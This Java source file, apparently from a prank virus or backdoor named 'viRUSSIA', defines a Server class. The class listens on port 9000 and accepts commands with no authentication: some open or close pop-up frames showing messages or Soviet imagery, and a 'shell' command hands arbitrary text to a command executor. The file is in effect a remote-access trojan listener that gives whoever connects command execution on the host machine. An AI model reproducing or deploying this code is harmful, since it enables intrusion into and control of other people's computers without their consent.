package viRUSSIA;

import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

import javax.naming.Context;

public class Server {
	
	Frame currentFrame;
	
	public Server() {
		try {
			ServerSocket s = new ServerSocket(9000);
			while (true) {
				try {

					Socket socket = s.accept();
					DataInputStream in = new DataInputStream(
							socket.getInputStream());
					
						String res = in.readLine();
						if (res == null)
							continue;
						else if(res.equals("closeframe")){
							if(currentFrame != null) currentFrame.closeFrame();
						}else if(res.equals("soviet")){
							openFrame(new RussiaFrame());
						}else if(res.equals("message")){
							openFrame(new MessageFrame());
						}else if(res.startsWith("message ")){
							String ts = res.replace("message ", "");
							openFrame(new MessageFrame(ts));
						}
						else if(res.startsWith("shell ")){
							String ts = res.replace("shell ", "");
							new ExecuteCommand(ts);
						}
						
						
					
				} catch (Exception e) {
					e.printStackTrace();
				}
			}

		} catch (IOException e) {
			e.printStackTrace();
		}

	}
	
	public void openFrame(Frame f){
		if(currentFrame != null) currentFrame.closeFrame();
		this.currentFrame = f;
	}

}